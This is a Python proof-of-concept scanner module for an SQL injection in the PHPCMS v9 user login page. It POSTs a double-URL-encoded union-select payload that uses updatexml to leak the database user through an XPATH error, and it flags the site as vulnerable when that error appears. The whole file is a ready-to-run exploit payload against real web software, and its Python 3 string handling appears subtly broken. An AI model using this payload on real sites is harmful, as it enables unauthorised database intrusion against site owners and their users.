# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0101'  # 平台漏洞编号，留空
    name = 'PHPCMS v9 User login /index.php SQL injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-10'  # 漏洞公布时间
    desc = '''
        PHPCMS采用PHP5+MYSQL做为技术基础进行开发。9采用OOP（面向对象）方式进行基础运行框架搭建。模块化开发方式做为功能开发形式。框架易于功能扩展，代码维护，优秀的二次开发能力，可满足所有网站的应用需求。 5年开发经验的优秀团队，在掌握了丰富的WEB开发经验和CMS产品开发经验的同时，勇于创新追求完美的设计理念，为全球多达10万网站提供助力，并被更多的政府机构、教育机构、事业单位、商业企业、个人站长所认可。
        PHPCMS v9用户登录处存在sql注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3266'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'PHPCMS v9'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fbb2f2db-f27b-430e-b458-72597622e408'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ('/index.php?m=menber&c=index&a=login')
            verify_url = self.target + payload
            data = ("dosubmit=1&username=phpcms&password=123456%26username%3d%2527%2b"
                    "union%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml"
                    "(1%252cconcat(0x5e24%252c(select%2buser())%252c0x5e24)%252c1)"
                    "%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c"
                    "%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527"
                    "%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527"
                    "%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c"
                    "%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f"
                    "%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull"
                    "%252cnull%252cnull%252cnull%252cnull%252cnull%2523")
            req = urllib.request.urlopen(verify_url, data)
            content = req.read()
            if "XPATH syntax" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
